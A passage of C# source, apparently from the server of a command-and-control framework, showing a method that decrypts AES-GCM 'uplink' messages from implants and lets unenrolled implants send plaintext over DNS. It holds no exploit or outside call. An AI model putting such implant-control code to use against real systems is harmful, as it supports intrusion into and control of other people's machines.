    /// a plaintext blob is tolerated only for an implant no enrollment
    /// bound to a key -- the DNS tradeoff's documented plaintext shape.
    /// </summary>
    private async Task<byte[]?> TryUnsealUplinkAsync(
        ImplantId implant,
        byte[] blob,
        byte[] aad,
        CancellationToken cancellationToken)
    {
        if (AesGcmEnvelope.TryReadKeyIdBody(blob) is { } keyId)
        {
            var carrier = await _payloads.FindByEnvelopeKeyAsync(keyId, cancellationToken);
            if (carrier?.EnvelopeKey is not { } key)
                return null;
            return AesGcmEnvelope.TryUnwrapBody(blob, keyId, key, aad);
        }
        return _contactKeys.TryGet(implant) is null ? blob : null;
    }
}
